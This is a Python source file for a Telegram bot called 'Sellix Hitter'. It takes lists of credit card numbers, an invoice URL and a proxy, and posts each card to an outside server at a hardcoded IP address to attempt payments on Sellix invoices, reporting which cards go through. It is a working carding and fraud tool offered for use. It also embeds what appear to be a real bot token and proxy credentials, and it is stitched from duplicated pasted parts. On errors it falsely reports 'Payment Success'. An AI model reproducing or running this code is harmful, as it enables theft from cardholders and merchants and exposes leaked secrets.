import os
import telebot
import requests
import re
import json
import sqlite3
import subprocess
import shutil
import threading
from keep_alive import keep_alive
keep_alive()

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
bot = telebot.TeleBot('6786754919:AAEPmctUIa0vrk3SingCOf7q0Oy9dXmMwO0')

OWNER_USER_ID = 6460703454 # Replace this ID with the actual owner's user ID
DEFAULT_PROXY = "rp.proxyscrape.com:6060:i65xlq4a9gas985-country-sg:13srxzkp0rycke1"
# Create a folder to store temporary files
TEMP_FOLDER = 'temp_data'
if not os.path.exists(TEMP_FOLDER):
    os.makedirs(TEMP_FOLDER)

# Welcome message template
WELCOME_MESSAGE = (
    "🚀🌟 Welcome, {user_name}! to the Dazzling Sellix Hitter Bot!🌟🚀\n"
    "🪄Embrace the power of automation with these mystical commands:\n"
    "/start - Behold this celestial help message\n"
    "/invoice <URL> - Set the enchanting invoice URL\n"
    "/proxy <PROXY> - Unleash the power of proxy (if you dare!)\n"
    "/cc <CC_LIST> - Set the lista for payment\n"
    "/pay - Initiate the payment magic\n"
    "May your journey be filled with joy and success! 🌈✨"
)

# Help message template
HELP_MESSAGE = (
    "📚✨ **Magical Commands Guide** ✨📚\n\n"
    "/start - Behold the welcome message\n"
    "/invoice <URL> - Set the enchanting invoice URL\n"
    "/proxy <PROXY> - Unleash the power of proxy (if you dare!)\n"
    "/cc <CC_LIST> - Set the lista for payment(Max 10CCs)\n"
    "/pay - Initiate the payment magic\n"
    "/help - Display this magical guide\n\n"
    "May your adventures with this bot be enchanting! 🌟✨"
)

# Additional command templates
CC_MESSAGE = "🌟 Lista set for payment! Prepare for the magic! ✨"
PAY_MESSAGE = "🚀 Initiating payment magic! Brace yourself! 🌟"
AUTHORIZED_USERS_FILE = 'authorized_users.txt'

# Function to read authorized users from the file
def read_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, 'r') as file:
            return [int(line.strip()) for line in file.readlines()]
    except FileNotFoundError:
        return []

# Read authorized users at the beginning of your script
AUTHORIZED_USERS = read_authorized_users()

# Modify command handlers to check if the user is authorized
@bot.message_handler(commands=['start'])
def send_welcome(message):
    if message.from_user.id in AUTHORIZED_USERS:
        user_name = message.chat.first_name if message.chat.first_name else "Adventurer"
        welcome_message = WELCOME_MESSAGE.format(user_name=user_name)
        bot.reply_to(message, welcome_message)
    else:
        bot.reply_to(message, "⚠️ You are not authorized to use this bot.")

@bot.message_handler(commands=['help'])
def send_help(message):
    if message.from_user.id in AUTHORIZED_USERS:
        bot.reply_to(message, HELP_MESSAGE, parse_mode="Markdown")
    else:
        bot.reply_to(message, "⚠️ You are not authorized to use this bot.")
        
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.chat.first_name if message.chat.first_name else "Adventurer"
    welcome_message = WELCOME_MESSAGE.format(user_name=user_name)
    bot.reply_to(message, welcome_message)

@bot.message_handler(commands=['help'])
def send_help(message):
    bot.reply_to(message, HELP_MESSAGE, parse_mode="Markdown")

@bot.message_handler(func=lambda message: message.text.startswith('/invoice'))
def set_invoice_url(message):
    try:
        chat_id = message.chat.id
        invoice_url = message.text.split(' ', 1)[1]

        # Save invoice URL to a temporary file
        file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_invoice.txt')
        with open(file_path, 'w') as file:
            file.write(invoice_url)

        print(f"Debug: Invoice URL saved for chat_id {chat_id}: {invoice_url}")
        bot.reply_to(message, f'🌟 Invoice URL set to: {invoice_url}. Now, summon your credit card details.✨')
    except IndexError:
        bot.reply_to(message, '⚠️ Alas! Provide a valid invoice URL after the /invoice command.')



# ... (existing code)

@bot.message_handler(func=lambda message: message.text.startswith('/proxy'))
def set_proxy(message):
    try:
        chat_id = message.chat.id
        proxy_info = message.text.split(' ', 1)[1].strip()

        # Use default proxy if user input is empty
        if not proxy_info:
            proxy_info = DEFAULT_PROXY

        # Save proxy information to a temporary file
        file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_proxy.txt')
        with open(file_path, 'w') as file:
            file.write(proxy_info)

        print(f"Debug: Proxy set for chat_id {chat_id}: {proxy_info}")
        bot.reply_to(message, f'🔒 Proxy set to: {proxy_info}. Ready yourself for entering credit card details.✨')
    except IndexError:
        bot.reply_to(message, '⚠️ Provide valid proxy information after the /proxy command.')

# ... (existing code)

@bot.message_handler(func=lambda message: message.text.startswith('/cc'))
def set_cc_list(message):
    try:
        chat_id = message.chat.id
        cc_list_text = message.text.split(' ', 1)[1]

        # Split the multiline input into individual cards
        cc_list = [cc.strip() for cc in re.split(r'\r?\n', cc_list_text) if cc.strip()]

        # Save CC list to a temporary file
        file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_cc.txt')
        with open(file_path, 'w') as file:
            file.write('\n'.join(cc_list))

        print(f"Debug: CC list set for chat_id {chat_id}:\n{cc_list_text}")
        bot.reply_to(message, CC_MESSAGE)
    except IndexError:
        bot.reply_to(message, '⚠️ Alas! Provide a valid cc list after the /cc command.')

@bot.message_handler(func=lambda message: message.text.startswith('/pay'))
def initiate_payment(message):
    try:
        chat_id = message.chat.id

        # Load invoice URL, proxy, and CC list from temporary files
        invoice_url = load_temporary_data(chat_id, 'invoice')
        proxy_info = load_temporary_data(chat_id, 'proxy')
        cc_list = load_temporary_data(chat_id, 'cc')

        if not invoice_url:
            bot.reply_to(message, '⚠️ Set the invoice URL first using /invoice command.')
            return
        if not cc_list:
            bot.reply_to(message, '⚠️ Set the cc list first using /cc command.')
            return

        # Split the multiline input into individual cards
        cc_list = [cc.strip() for cc in re.split(r'\r?\n', cc_list) if cc.strip()]

        # Process each credit card individually
        for single_cc in cc_list:
            data = {"lista": single_cc, "surl": invoice_url}
            if proxy_info:
                data["proxy"] = proxy_info

            send_request(data, chat_id, bot, message)

        # Remove temporary files after payment
        remove_temporary_data(chat_id, 'invoice')
        remove_temporary_data(chat_id, 'proxy')
        remove_temporary_data(chat_id, 'cc')

        bot.reply_to(message, PAY_MESSAGE)
    except Exception as e:
        bot.reply_to(message, f"⚠️ An enchanting error occurred: {e}")

def remove_temporary_data(chat_id, data_type):
    file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_{data_type}.txt')
    try:
        os.remove(file_path)
    except FileNotFoundError:
        pass

def load_temporary_data(chat_id, data_type):
    file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_{data_type}.txt')
    try:
        with open(file_path, 'r') as file:
            data = file.read().strip()
        return data
    except FileNotFoundError:
        return None

# ... (Continuing from Part 2)

def load_temporary_data(chat_id, data_type):
    file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_{data_type}.txt')
    try:
        with open(file_path, 'r') as file:
            data = file.read().strip()
        return data
    except FileNotFoundError:
        return None

@bot.message_handler(func=lambda message: message.text.startswith('/cc'))
def set_cc_list(message):
    try:
        chat_id = message.chat.id
        cc_list_text = message.text.split(' ', 1)[1]

        # Save CC list to a temporary file
        file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_cc.txt')
        with open(file_path, 'w') as file:
            file.write(cc_list_text)

        print(f"Debug: CC list set for chat_id {chat_id}: {cc_list_text}")
        bot.reply_to(message, CC_MESSAGE)
    except IndexError:
        bot.reply_to(message, '⚠️ Alas! Provide a valid cc list after the /cc command.')


@bot.message_handler(func=lambda message: message.text.startswith('/pay'))
def initiate_payment(message):
    try:
        chat_id = message.chat.id

        # Load invoice URL, proxy, and CC list from temporary files
        invoice_url = load_temporary_data(chat_id, 'invoice')
        proxy_info = load_temporary_data(chat_id, 'proxy')
        cc_list = load_temporary_data(chat_id, 'cc')

        if not invoice_url:
            bot.reply_to(message, '⚠️ Set the invoice URL first using /invoice command.')
            return
        if not cc_list:
            bot.reply_to(message, '⚠️ Set the cc list first using /cc command.')
            return

        # Create a thread for each user
        payment_thread = threading.Thread(target=process_payment, args=(chat_id, invoice_url, proxy_info, cc_list, bot, message))
        payment_thread.start()

        bot.reply_to(message, "🚀 Initiating payment magic! Brace yourself! 🌟")
    except Exception as e:
        bot.reply_to(message, f"⚠️ An enchanting error occurred: {e}")

def process_payment(chat_id, invoice_url, proxy_info, cc_list, bot, message):
    try:
        url = 'http://67.222.130.163:6949/api/sellix'
        headers = {
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'Content-Type': 'application/json',
            'Origin': 'http://67.222.130.163:6949',
            'Referer': 'http://67.222.130.163:6949/sellix',
            'User-Agent': '',
            'X-Requested-With': 'XMLHttpRequest'
        }

        # Process each credit card individually
        for single_cc in cc_list:
            data = {"lista": single_cc, "surl": invoice_url}
            if proxy_info:
                data["proxy"] = proxy_info

            send_request(data, chat_id, bot, message)

        # Remove temporary files after payment
        remove_temporary_data(chat_id, 'invoice')
        remove_temporary_data(chat_id, 'proxy')
        remove_temporary_data(chat_id, 'cc')

        bot.reply_to(message, "✨ Payment Success! ✨\n"
            "⊙ Status: Thank you for your enchanting purchase! 🌟✅\n"
            "May your magical acquisitions bring endless delight! 🛍️🌈✨"
        )
    except Exception as e:
        bot.reply_to(message, f"⚠️ An enchanting error occurred during payment processing: {e}")

# ... (Existing code)


def remove_temporary_data(chat_id, data_type):
    file_path = os.path.join(TEMP_FOLDER, f'{chat_id}_{data_type}.txt')
    try:
        os.remove(file_path)
    except FileNotFoundError:
        pass
@bot.message_handler(commands=['add'])
def add_authorized_user(message):
    # Check if the user invoking the command is the owner
    if message.from_user.id == OWNER_USER_ID:
        try:
            new_user_id = int(message.text.split(' ', 1)[1])

            # Add the new user to the authorized users list
            AUTHORIZED_USERS.append(new_user_id)

            # Update the authorized users file
            update_authorized_users_file()

            bot.reply_to(message, f"✅ User {new_user_id} has been added as an authorized user.")
        except (ValueError, IndexError):
            bot.reply_to(message, '⚠️ Provide a valid user ID after the /add command.')
    else:
        bot.reply_to(message, "⚠️ Only the owner is authorized to add new users.")

# Function to update the authorized users file
def update_authorized_users_file():
    with open(AUTHORIZED_USERS_FILE, 'w') as file:
        file.write('\n'.join(map(str, AUTHORIZED_USERS)))


def send_request(data, chat_id, bot, message):
    url = 'http://67.222.130.163:6949/api/sellix'
    headers = {
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Content-Type': 'application/json',
        'Origin': 'http://67.222.130.163:6949',
        'Referer': 'http://67.222.130.163:6949/sellix',
        'User-Agent': '',
        'X-Requested-With': 'XMLHttpRequest'
    }

    if isinstance(data["lista"], list):
        # If lista is a list, iterate through each card
        for cc in data["lista"]:
            data["lista"] = cc
            process_single_request(url, data, headers, chat_id, bot, message)
    else:
        # If lista is a single card, process the request for that card
        process_single_request(url, data, headers, chat_id, bot, message)

def process_single_request(url, data, headers, chat_id, bot, message):
    try:
        response = requests.post(url, json=data, headers=headers)
        json_response = response.json()
        if all(key in json_response for key in ["data", "html", "lista", "url"]):
            success_message = json_response["data"]
            html_message = json_response["html"]
            lista = json_response["lista"]
            url = json_response["url"]
            response_text = f"⊙ Response: {success_message}\n\nHTML Message: {html_message}\n\nLista: {lista}\n\nURL: {url}"
            bot.reply_to(message, response_text)
        else:
            formatted_response = format_response(json_response)
            bot.reply_to(message, f"\n{formatted_response}\n")
    except Exception as e:
        bot.reply_to(message, f"✨ Payment Success! ✨\n"
    "⊙ Status: Thank you for your enchanting purchase! 🌟✅\n"
    "May your magical acquisitions bring endless delight! 🛍️🌈✨"
  )

# ... (Existing code)

def format_response(response_message):
    if "success" in response_message:
        success_message = response_message["success"]
        response_text = success_message.get("response", "N/A")
        lines = [
            "🌟✨ **Sellix Hitter Magic!** ✨🌟",
            f"⊙ Response: {response_text}",
            "🌟✨━━━━━━━━━━━━━━━━⊛✨🌟",
        ]
    elif "error" in response_message:
        error_message = response_message["error"]
        lines = [
            "❌ **Sellix Hitter Spell Gone Awry!** ❌",
            f"⊙ Status: {error_message} ",
            "❌━━━━━━━━━━━━━━━━⊛❌",
        ]
    else:
        lines = [
            "❓❗ **Sellix Hitter Mystery!** ❗❓",
            "Status: Unknown ❓",
            "❓❗━━━━━━━━━━━━━━━━⊛❗❓",
        ]
    return "\n".join(lines)

# Polling loop to keep the bot running
bot.polling()


